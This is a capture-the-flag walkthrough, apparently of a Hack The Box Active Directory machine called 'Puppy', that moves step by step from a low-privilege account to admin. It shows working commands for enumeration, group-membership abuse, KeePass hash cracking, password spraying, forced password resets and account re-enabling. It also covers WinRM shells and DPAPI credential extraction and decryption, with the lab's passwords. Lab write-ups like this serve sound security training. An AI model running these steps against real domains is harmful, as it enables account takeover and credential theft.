Difficulty: Medium
### Information Gathering

IP Address: 10.129.232.75
Username: `levi.james`
Password: `KingofAkron2025!`

# User Flag
#### Service Enumeration

NMAP Enumeration through the ports.
```
sudo nmap 10.129.232.75
```

```
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
111/tcp  open  rpcbind
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
2049/tcp open  nfs
3260/tcp open  iscsi
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
```

```
sudo nmap 10.129.232.75 -sC -sV
```

An entry will be added to the `/etc/hosts` file.
```
10.129.232.75     puppy.htb dc.puppy.htb
```

The SMB Shares are checked from this user.
```
netexec smb 10.129.232.75 -u 'levi.james' -p 'KingofAkron2025!' --shares
```

RPC is also enumerated. It returned a list of users.
```
rpcclient 10.129.232.75 -U 'levi.james%KingofAkron2025!'
rpcclient $> enumdomusers
```

```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[levi.james] rid:[0x44f]
user:[ant.edwards] rid:[0x450]
user:[adam.silver] rid:[0x451]
user:[jamie.williams] rid:[0x452]
user:[steph.cooper] rid:[0x453]
user:[steph.cooper_adm] rid:[0x457]
```

The users will be provided into a users list.
```
cat test.txt | cut -d] -f1 | cut -d'[' -f2 > users.txt
```

```
Administrator
Guest
krbtgt
levi.james
ant.edwards
adam.silver
jamie.williams
steph.cooper
steph.cooper_adm
```

Bloodhound enumeration is performed with the user.
```
bloodhound-ce-python -u 'levi.james' -p 'KingofAkron2025!' -ns 10.129.232.75 -d puppy.htb -c All --zip
```

As seen in Bloodhound, it is possible to see that this user has `GenericWrite`privileges to this user.
![](<Screenshot 2026-07-27 at 18.20.02.png>)

The user can be added to the Developers group with this command.
```
net rpc group addmem "Developers" "levi.james" -U "puppy"/"levi.james"%'KingofAkron2025!' -S "dc.puppy.htb"
```

After checking the shares, the user now have access to the share `DEV`.
```
netexec smb puppy.htb -u 'levi.james' -p 'KingofAkron2025!' --shares
```

```
smblient //puppy.htb/DEV -U 'levi.james%KingofAkron2025!'
```

It is possible to see that there is a kdbx file.
The file will be downloaded on the attacker's system.
```
smb: \> dir
  .                                  DR        0  Sun Mar 23 03:07:57 2025
  ..                                  D        0  Sat Mar  8 11:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 03:09:12 2025
  Projects                            D        0  Sat Mar  8 11:53:36 2025
  recovery.kdbx                       A     2677  Tue Mar 11 22:25:46 2025
smb: \> get recovery.kdbx
```

It is possible to see that this is a KDBX v4 file.
```
kpcli --kdb recovery.kdbx
KDBX4 files are not directly supported, but they can be imported.
 - The KDBX format is supported through version 3.1.
 - To import a KDBX v4 file, use the import command.
 - For details, see: help import
```

In order to extract its password, a newer version of john is required. The file will be downloaded here.
```
git clone https://github.com/ivanmrsulja/keepass2john.git
```

The hash will be now extracted and cracked.
```
python keepass2john.py ~/recovery.kdbx > hash.txt
```

```
hashcat -m 34300 hash.txt rockyou.txt
```

The password is `liverpool`
The kdbx file can be read through this command.
```bash
keepassxc recovery.kdbx
```

After the password is entered, the database is displayed.
![](<Screenshot 2026-07-27 at 20.14.47.png>)

Here is a list of passwords obtained from the database.
```
Steve2025!
ILY2025!
JamieLove2025
Antman2025!
HJKL2025!
```

A bruteforce attack is attempted with those passwords.
```
netexec smb puppy.htb -u users.txt -p pass.txt --continue-on-success
```

The only one working credentials is `ant.edwards:Antman2025!`

Through Bloodhound, this user have writable access to the `DEV` share.

![](<Screenshot 2026-07-27 at 20.19.50.png>)

Changing now the password for `adam.silver`.
```
net rpc password "adam.silver" "pass123@" -U "puppy"/"ant.edwards"%'Antman2025!' -S
dc.puppy.htb
```

While the account seems to be disabled, it is possible to re-enable the account.
```
bloodyAD --host 10.129.232.75 -d puppy.htb -u ant.edwards -p 'Antman2025!' remove uac 'adam.silver' -f ACCOUNTDISABLE
```

The WinRM Session will be connected.
```
evil-winrm -i puppy.htb -u 'adam.silver' -p 'pass123@'
```

The user flag has been obtained.
![](<Screenshot 2026-07-27 at 20.40.58.png>)

# Root Flag
#### Privilege Escalation

After checking the `C:\Backups` folder, it is possible to see some credentials.

The credentials are `steph.cooper%ChefSteph2025!`

After checking the directories and enumerating, it is possible to see that credentials are displayed.

```
cmd /c "dir /S /AS C:\Users\<user>\AppData\Local\Microsoft\Credentials"
cmd /c "dir /S /AS C:\Users\<user>\AppData\Roaming\Microsoft\Protect"
```

Although the respective files are present, they cannot be downloaded through WinRM.

The files will be extracted through Base64 and transferred through the systems.

```
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D"))
```

```
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```

After the files have been now extracted successfully, the DPAPI is exploited.
```
impacket-dpapi masterkey -file file2.txt -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'
```

The key is `0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84`

Then, the credentials are now displayed.
```
impacket-dpapi credential -file file1.txt -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

The credentials can be used to login as admin session.
```
evil-winrm -i puppy.htb -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!'
```

While the user is not administrator, it can access the administrator folder.

The root flag has been successfully obtained.![](<Screenshot 2026-07-27 at 21.40.38.png>)